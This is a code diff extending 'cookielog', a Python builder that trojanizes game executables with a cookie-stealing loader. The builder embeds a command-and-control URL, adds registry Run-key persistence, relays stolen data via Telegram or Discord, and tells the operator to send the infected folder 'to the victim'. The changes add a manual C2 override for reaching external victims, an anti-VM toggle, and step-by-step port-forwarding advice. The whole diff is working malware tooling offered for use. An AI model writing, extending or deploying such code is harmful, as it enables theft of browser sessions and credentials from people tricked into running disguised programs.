@@ -21,6 +21,8 @@ Usage:
     python auto.py game.exe --persist   # install registry Run key on victim
     python auto.py game.exe --telegram bot_token:chat_id   # relay via Telegram
     python auto.py game.exe --discord https://discord.com/api/webhooks/...  # relay via Discord
+    python auto.py game.exe --c2 http://1.2.3.4:9400/      # manual C2 URL (for NAT/external)
+    python auto.py game.exe --no-anti-vm                    # disable VM detection (for testing in VMs)
 
     python auto.py --config             # show saved settings (config.json)
     python auto.py --clear-telegram     # remove saved Telegram token
@@ -63,6 +65,8 @@ MAGIC  = b"CKLG"
 C2_SENTINEL = b"CKC2_DEADBEEF_"
 PERSIST_SENTINEL = b"CKPR____"
 PERSIST_ENABLE = b"CKPR0001"
+AV_SENTINEL = b"CKAV0000"
+AV_DISABLE  = b"CKAV0001"
 
 def log(msg):
     print(msg, flush=True)
@@ -156,6 +160,23 @@ def detect_ip():
         except Exception:
             return "127.0.0.1"
 
+def _is_private_ip(ip):
+    """Check if IP is a private/LAN address (RFC 1918). Returns True for 10.x, 172.16-31.x, 192.168.x."""
+    try:
+        parts = [int(x) for x in ip.split(".")]
+        if len(parts) != 4:
+            return False
+        a, b = parts[0], parts[1]
+        if a == 10:
+            return True
+        if a == 172 and 16 <= b <= 31:
+            return True
+        if a == 192 and b == 168:
+            return True
+        return False
+    except Exception:
+        return False
+
 def ensure_build():
     """Build loader.exe + ckdll.dll if they don't exist."""
     if os.path.isfile(LOADER) and os.path.isfile(DLL):
@@ -222,8 +243,11 @@ def find_main_exe(folder):
 
 # ------------------------------------------------------------------ infection
 
-def _patch_loader(loader_bytes, c2_url, persist=False):
-    """Strip old appended data from loader, patch C2 + persistence sentinels. Returns patched bytes."""
+def _patch_loader(loader_bytes, c2_url, persist=False, no_anti_vm=False):
+    """Strip old appended data from loader, patch C2 + persistence + anti-VM sentinels.
+    Returns patched bytes.
+    The sentinels are in the LOADER's .data section (plaintext), not in the
+    encrypted payload — the loader patches the decrypted payload at runtime."""
     idx = loader_bytes.rfind(MAGIC)
     if idx != -1 and idx > len(loader_bytes) - 12:
         old_len = struct.unpack_from("<I", loader_bytes, idx - 4)[0]
@@ -238,6 +262,10 @@ def _patch_loader(loader_bytes, c2_url, persist=False):
         pidx = loader_bytes.find(PERSIST_SENTINEL)
         if pidx != -1:
             loader_bytes = loader_bytes[:pidx] + PERSIST_ENABLE + loader_bytes[pidx+8:]
+    if no_anti_vm:
+        aidx = loader_bytes.find(AV_SENTINEL)
+        if aidx != -1:
+            loader_bytes = loader_bytes[:aidx] + AV_DISABLE + loader_bytes[aidx+8:]
     return loader_bytes
 
 def _extract_original_host(host_bytes):
@@ -250,27 +278,27 @@ def _extract_original_host(host_bytes):
             return host_bytes[hidx - 4 - old_hlen : hidx - 4]
     return host_bytes
 
-def build_infected_bytes(host_path, c2_url, persist=False):
+def build_infected_bytes(host_path, c2_url, persist=False, no_anti_vm=False):
     """Read host, patch loader, return infected bytes [loader][host][len][CKLG]."""
     with open(LOADER, "rb") as f:
         loader_bytes = f.read()
     with open(host_path, "rb") as f:
         host_bytes = f.read()
-    loader_bytes = _patch_loader(loader_bytes, c2_url, persist)
+    loader_bytes = _patch_loader(loader_bytes, c2_url, persist, no_anti_vm)
     host_bytes = _extract_original_host(host_bytes)
     return loader_bytes + host_bytes + struct.pack("<I", len(host_bytes)) + MAGIC
 
-def build_infected_standalone(host_path, c2_url, persist=False):
+def build_infected_standalone(host_path, c2_url, persist=False, no_anti_vm=False):
     """Infect a standalone .exe -> ifec/apps/<name>.exe"""
     os.makedirs(IFEC_APPS, exist_ok=True)
     bname = os.path.basename(host_path)
     out_path = os.path.join(IFEC_APPS, bname)
-    infected = build_infected_bytes(host_path, c2_url, persist)
+    infected = build_infected_bytes(host_path, c2_url, persist, no_anti_vm)
     with open(out_path, "wb") as f:
         f.write(infected)
     return out_path
 
-def build_infected_folder(host_dir, c2_url, persist=False):
+def build_infected_folder(host_dir, c2_url, persist=False, no_anti_vm=False):
     """Copy folder to ifec/folds/<folder_name>/, infect the main .exe in place.
 
     Returns (out_exe_path, original_exe_path) or (None, None) if no .exe found.
@@ -298,7 +326,7 @@ def build_infected_folder(host_dir, c2_url, persist=False):
 
     # infect the exe in place: overwrite the copy with the infected version
     dest_exe = os.path.join(dest_folder, os.path.relpath(exe_path, host_dir))
-    infected = build_infected_bytes(exe_path, c2_url, persist)
+    infected = build_infected_bytes(exe_path, c2_url, persist, no_anti_vm)
     with open(dest_exe, "wb") as f:
         f.write(infected)
 
@@ -1024,7 +1052,7 @@ def interactive_loop():
             log("invalid command: '%s' -- type 'help' for command list" % cmd)
 
 
-def run_one(host_path, mode, run_local, port, telegram, discord, persist):
+def run_one(host_path, mode, run_local, port, telegram, discord, persist, no_anti_vm=False, c2_override=None):
     """Execute the full infect flow for a single target."""
     log("=" * 60)
     log("  cookielog -- infecting %s" % os.path.basename(host_path))
@@ -1038,15 +1066,25 @@ def run_one(host_path, mode, run_local, port, telegram, discord, persist):
 
     # 2. detect IP
     log("\n[2/5] detecting attacker IP...")
-    ip = detect_ip()
-    c2_url = "http://%s:%d/" % (ip, port)
-    log("[+] C2 URL: %s" % c2_url)
+    if c2_override:
+        c2_url = c2_override
+        ip = c2_override
+        log("[+] C2 URL (manual): %s" % c2_url)
+    else:
+        ip = detect_ip()
+        c2_url = "http://%s:%d/" % (ip, port)
+        log("[+] C2 URL: %s" % c2_url)
     if telegram:
         log("[+] Telegram relay: enabled")
     if discord:
         log("[+] Discord relay: enabled")
     if persist:
         log("[+] Persistence: enabled (registry Run key)")
+    if no_anti_vm:
+        log("[+] Anti-VM: DISABLED (--no-anti-vm)")
+    if not c2_override and ip != "127.0.0.1" and _is_private_ip(ip):
+        log("[!] WARNING: IP %s is LAN/private -- external machines can't reach it." % ip)
+        log("[!]   Use --c2 http://YOUR_PUBLIC_IP:%d/ for external targets." % port)
     if run_local:
         c2_url = "http://127.0.0.1:%d/" % port
         log("[+] C2 URL (local test): %s" % c2_url)
@@ -1062,7 +1100,7 @@ def run_one(host_path, mode, run_local, port, telegram, discord, persist):
     log("\n[4/5] infecting...")
     try:
         if mode == "folder":
-            out_path, orig_exe = build_infected_folder(host_path, c2_url, persist)
+            out_path, orig_exe = build_infected_folder(host_path, c2_url, persist, no_anti_vm)
             if not out_path:
                 listener.terminate()
                 return
@@ -1074,7 +1112,7 @@ def run_one(host_path, mode, run_local, port, telegram, discord, persist):
                 log("  READY -- send ifec/folds/%s/ to the victim" % folder_name)
             log("=" * 60)
         else:
-            out_path = build_infected_standalone(host_path, c2_url, persist)
+            out_path = build_infected_standalone(host_path, c2_url, persist, no_anti_vm)
             bname = os.path.basename(out_path)
             log("[+] infected: ifec/apps/%s" % bname)
             log("[+] C2 URL embedded: %s" % c2_url)
@@ -1144,6 +1182,8 @@ def main():
     show_cfg = False
     clear_tg = False
     clear_dc = False
+    c2_override = None
+    no_anti_vm = False
 
     # parse args
     args = sys.argv[1:]
@@ -1162,6 +1202,10 @@ def main():
             discord = args[i + 1]; i += 2
         elif a == "--persist":
             persist = True; i += 1
+        elif a == "--c2" and i + 1 < len(args):
+            c2_override = args[i + 1]; i += 2
+        elif a == "--no-anti-vm":
+            no_anti_vm = True; i += 1
         elif a == "--config":
             show_cfg = True; i += 1
         elif a == "--clear-telegram":
@@ -1239,17 +1283,31 @@ def main():
 
     # 2. detect IP + build C2 URL
     log("\n[2/5] detecting attacker IP...")
-    ip = detect_ip()
-    c2_url = "http://%s:%d/" % (ip, port)
-    log("[+] C2 URL: %s" % c2_url)
+    if c2_override:
+        c2_url = c2_override
+        log("[+] C2 URL (manual): %s" % c2_url)
+    else:
+        ip = detect_ip()
+        c2_url = "http://%s:%d/" % (ip, port)
+        log("[+] C2 URL: %s" % c2_url)
     if telegram:
         log("[+] Telegram relay: enabled")
     if discord:
         log("[+] Discord relay: enabled")
     if persist:
         log("[+] Persistence: enabled (registry Run key)")
+    if no_anti_vm:
+        log("[+] Anti-VM: DISABLED (--no-anti-vm) — payload will run in VMs")
     if ip == "127.0.0.1":
         log("[!] could not detect local IP -- using 127.0.0.1 (localhost only)")
+    elif not c2_override and _is_private_ip(ip):
+        log("[!] WARNING: detected IP %s is a LAN/private address." % ip)
+        log("[!]   Machines outside your LAN CANNOT reach this IP.")
+        log("[!]   For external targets, use:")
+        log("[!]     1. Port-forward port %d on your router to this machine" % port)
+        log("[!]     2. Find your public IP (e.g. https://api.ipify.org)")
+        log("[!]     3. Re-run with: --c2 http://YOUR_PUBLIC_IP:%d/" % port)
+        log("[!]   Or use the Telegram/Discord relay if the C2 port is firewalled.")
     if run_local:
         log("[*] mode: LOCAL TEST (will run infected exe on this machine)")
         c2_url = "http://127.0.0.1:%d/" % port
@@ -1305,7 +1363,7 @@ def main():
     log("\n[5/5] infecting...")
     try:
         if mode == "folder":
-            out_path, orig_exe = build_infected_folder(host_path, c2_url, persist)
+            out_path, orig_exe = build_infected_folder(host_path, c2_url, persist, no_anti_vm)
             if not out_path:
                 listener.terminate()
                 return 1
@@ -1322,7 +1380,7 @@ def main():
                 log("  cookies will appear in loot/cookies.json")
             log("=" * 60)
         else:
-            out_path = build_infected_standalone(host_path, c2_url, persist)
+            out_path = build_infected_standalone(host_path, c2_url, persist, no_anti_vm)
             bname = os.path.basename(out_path)
             log("[+] infected: ifec/apps/%s" % bname)
             log("    loader: %d KB + host: %d KB = %d KB" % (
